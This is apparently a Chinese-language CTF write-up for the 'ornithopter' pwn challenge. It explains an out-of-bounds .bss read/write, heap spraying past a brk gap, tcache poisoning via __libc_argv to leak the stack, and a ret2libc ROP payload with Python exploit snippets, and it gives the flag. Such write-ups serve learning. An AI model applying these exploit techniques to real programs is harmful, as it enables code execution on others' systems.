# ornithopter

## 题目简述

程序在 `.bss` 中定义了 300 个 `ornithopter` 结构体，每项由一个 `pilot` 指针和一个 `id` 组成，但三个菜单分支都没有检查下标。题目要求把只向高地址延伸的越界读写扩展到堆区，再利用 glibc tcache 元数据定位栈并覆盖 `main` 的返回地址。

## 解题过程

结构体大小为 $16$ 字节，数组基址记为 $B$。`Fly` 会泄露

$$
*(B+16i+8)
$$

而 `Change id` 能向同一位置写入任意 8 字节。由于 `idx` 是无符号整数，只能访问数组之后的高地址，不能直接用负下标攻击数组前方。

Linux 对 `brk` 堆起点加入的随机间隙上限约为 `0x2000000`。官方脚本先进行堆喷：

1. 申请约 250 个接近 `0x20000` 字节的 chunk，把 `brk` 堆扩展到 `.bss` 可达范围；
2. 将较低位置的 chunk 缩小并释放、合并，再以一个大 chunk 吃掉合并区；
3. 把大部分旧指针替换成 `0x3000000` 字节的 mmap chunk，从而释放原来的 `brk` 区域；
4. 申请 `0x2000000 + 0x290` 字节并用 `Z` 填充开头。

随后使用越界 `Fly` 以 $16$ 字节为步长向下扫描，找到连续的 `ZZZZZZZZ` 标记及其边界。这样即使 `brk` 间隙随机，也能计算 `.bss` 数组到堆基址的结构体下标 `heap_idx`。

在已知堆位置后，官方脚本再申请一个特定大小的大块，使可读区域出现 large-bin 元数据。两个相邻机器字分别指向 libc 和堆内地址，减去题目所附 libc 与本次堆布局的固定偏移即可恢复两个基址。

最后直接利用越界写修改 tcache 元数据。先把 $0x30$ 大小类的链表头设为 libc 中的 `__libc_argv`，再申请一次该大小的 chunk。tcache 会把该位置原有的栈指针作为 safe-linking 链表值写回头部，因此读取并解码：

```python
libc_argv = libc.address + 0x2046e0
set_id(tcache_head_idx, libc_argv)
set_pilot(3, 0x30 - 8, b"\x00" * 7)

argv = get_id(tcache_head_idx) ^ (libc_argv >> 12)
saved_frame = argv - 0x128
```

将同一 tcache 头再次改成 `main` 保存栈帧的位置，下一次申请便返回该栈地址。写入 8 字节填充以及 `pop rdi; ret`、`/bin/sh`、单独的 `ret` 和 `system`，形成 ret2libc：

```python
pop_rdi = libc.address + 0x10f75b
ret = pop_rdi + 1
binsh = next(libc.search(b"/bin/sh\x00"))

payload = b"A" * 8
payload += p64(pop_rdi) + p64(binsh)
payload += p64(ret) + p64(libc.sym["system"])[:-1]

set_id(tcache_head_idx, saved_frame)
set_pilot(4, 0x30 - 8, payload)
```

末尾故意只发送 `system` 地址的前 7 字节，使 payload 恰好占满 `fgets` 可读的 39 字节；残留换行令下一次菜单解析退出，`main` 返回时执行 ROP。读取 flag 得到：

```text
UMDCTF{flapping_wings_can_take_you_far}
```

## 方法总结

本题首先提供的是 `.bss` 后方的步进式任意读写，而不是现成的栈溢出。关键是利用 `brk` 随机间隙有上界，通过堆喷和标记扫描建立 `.bss` 到堆的坐标系；随后才有条件读取 bin 元数据、篡改 tcache、借 `__libc_argv` 泄露栈地址并完成栈劫持。
